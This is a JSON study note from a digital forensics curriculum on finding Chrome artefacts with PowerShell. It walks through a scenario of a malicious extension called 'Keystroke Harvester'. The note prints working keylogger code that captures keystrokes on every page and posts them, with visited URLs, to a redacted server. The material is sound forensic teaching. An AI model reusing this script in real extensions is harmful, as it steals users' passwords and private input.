@@ -1,0 +1,92 @@
+{
+  "id": "windows forensics/windows applications forensics/dissecting browser artefacts ii google chrome",
+  "title": "Dissecting Browser Artefacts II Google Chrome",
+  "slug": "dissecting-browser-artefacts-ii-google-chrome",
+  "relPath": "Windows Forensics/Windows Applications Forensics/Dissecting Browser Artefacts II Google Chrome.md",
+  "level": "L2",
+  "curriculumLevelId": "l2",
+  "curriculumSectionId": "l2-dfir",
+  "curriculumSectionTitle": "Digital Forensics (DFIR)",
+  "tags": [
+    "PowerShell",
+    "Windows",
+    "Web",
+    "DFIR"
+  ],
+  "mitre": [],
+  "parentId": "windows forensics/windows applications forensics",
+  "children": [],
+  "relatedLinks": [],
+  "backlinks": [
+    "windows forensics/windows applications forensics"
+  ],
+  "breadcrumbs": [
+    {
+      "id": "windows forensics",
+      "title": "Windows Forensics",
+      "slug": "windows-forensics"
+    },
+    {
+      "id": "windows forensics/windows applications forensics",
+      "title": "Windows Applications Forensics",
+      "slug": "windows-applications-forensics"
+    },
+    {
+      "id": "windows forensics/windows applications forensics/dissecting browser artefacts ii google chrome",
+      "title": "Dissecting Browser Artefacts II Google Chrome",
+      "slug": "dissecting-browser-artefacts-ii-google-chrome"
+    }
+  ],
+  "headings": [
+    {
+      "level": 1,
+      "text": "Dissecting Browser Artefacts II: Google Chrome"
+    },
+    {
+      "level": 1,
+      "text": "Scenario: Malicious Browser Extension"
+    }
+  ],
+  "overview": "Google Chrome's browsing data are stored in the user's AppData\\Local\\Google\\Chrome\\User Data directory. In addition, the default Chrome user profile is stored in the Default directory. Like the previous task, let's enumerate each user directory and see if any Google Chrome artefacts are available using the command below.",
+  "study": {
+    "overview": "Google Chrome's browsing data are stored in the user's AppData\\Local\\Google\\Chrome\\User Data directory. In addition, the default Chrome user profile is stored in the Default directory. Like the previous task, let's enumerate each user directory and see if any Google Chrome artefacts are available using the command below.",
+    "whySoc": "Use this note as an analyst reference: understand the concept, identify the relevant telemetry, pivot through evidence, and document the decision path clearly.",
+    "keyConcepts": [
+      "Dissecting Browser Artefacts II: Google Chrome",
+      "Scenario: Malicious Browser Extension"
+    ],
+    "workflow": [
+      "Identify the user, host, process, network flow, or identity object involved.",
+      "Collect the highest-value logs first and preserve timestamps and assumptions.",
+      "Pivot through related notes, telemetry sources, and MITRE references.",
+      "Document findings, gaps, containment options, and detection improvements."
+    ],
+    "splunkExamples": [],
+    "importantCommands": [
+      {
+        "language": "powershell",
+        "code": "PS C:\\Users\\Administrator> ls C:\\Users\\ | foreach {ls \"C:\\Users\\$_\\AppData\\Local\\Google\\Chrome\\User Data\\Default\" 2>$null | findstr Directory}"
+      },
+      {
+        "language": "powershell",
+        "code": "PS C:\\Users\\Administrator> cd 'C:\\Users\\mike.myers\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\'\nPS C:\\Users\\mike.myers\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions> ls\n\n    Directory: C:\\Users\\tryhackme\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----         3/3/2024   7:11 PM                nchfdofnmealimhgfkncdfkionopnanf\nd-----        1/12/2023   2:41 PM                nmmhkkegccagdldgiimedpiccmgmieda\nd-----         3/3/2024   7:11 PM                Temp"
+      },
+      {
+        "language": "powershell",
+        "code": "PS C:\\Users\\mike.myers\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions> cd .\\nchfdofnmealimhgfkncdfkionopnanf\\1.0_0\\\n\nPS C:\\Users\\mike.myers\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\nchfdofnmealimhgfkncdfkionopnanf\\1.0_0> cat manifest.json\n{\n   \"background\": {\n      \"service_worker\": \"background.js\"\n   },\n   \"content_scripts\": [ {\n      \"js\": [ \"script.js\" ],\n      \"matches\": [ \"*://*/*\" ]\n   } ],\n   \"description\": \"Collect and report keystrokes.\",\n   \"icons\": {\n      \"128\": \"icons/icon128.png\",\n      \"16\": \"icons/icon16.png\",\n      \"48\": \"icons/icon48.png\"\n   },\n   \"key\": \"REDACTED\",\n   \"manifest_version\": 3,\n   \"name\": \"Keystroke Harvester\",\n   \"version\": \"1.0\"\n}\n\nPS C:\\Users\\mike.myers\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\nchfdofnmealimhgfkncdfkionopnanf\\1.0_0> cat .\\background.js\nchrome.runtime.onMessage.addListener(\n  function (request, sender, sendResponse) {\n    sendResponse(request);\n  }\n);"
+      },
+      {
+        "language": "powershell",
+        "code": "PS C:\\Users\\mike.myers\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\nchfdofnmealimhgfkncdfkionopnanf\\1.0_0> cat .\\background.js\nchrome.runtime.onMessage.addListener(\n  function (request, sender, sendResponse) {\n    sendResponse(request);\n  }\n);"
+      },
+      {
+        "language": "powershell",
+        "code": "PS C:\\Users\\mike.myers\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\nchfdofnmealimhgfkncdfkionopnanf\\1.0_0> cat .\\script.js\nvar keys = '';\nvar current = document.URL;\n\nvar xhr = new XMLHttpRequest();\nxhr.open(\"POST\", \"REDACTED_URL\", true);\nxhr.setRequestHeader('Content-Type', 'application/json');\nconst json = {\n    \"logged\": current,\n};\nxhr.send(JSON.stringify(json));\n\ndocument.onkeydown = function (e) {\n    var get = window.event ? event : e;\n    var key = get.keyCode ? get.keyCode : get.charCode;\n    key = String.fromCharCode(key);\n    keys += key;\n}\n\nwindow.setInterval(function () {\n    if (keys != \"\") {\n        var xhr_key = new XMLHttpRequest();\n        xhr_key.open(\"POST\", \"REDACTED_URL\", true);\n        xhr_key.setRequestHeader('Content-Type', 'application/json');\n        const json_key = {\n            \"logged\": keys,\n        };\n        xhr_key.send(JSON.stringify(json_key));\n        keys = \"\";\n    }\n}, REDACTED);"
+      }
+    ],
+    "tools": [
+      "PowerShell"
+    ],
+    "tips": []
+  }
+}
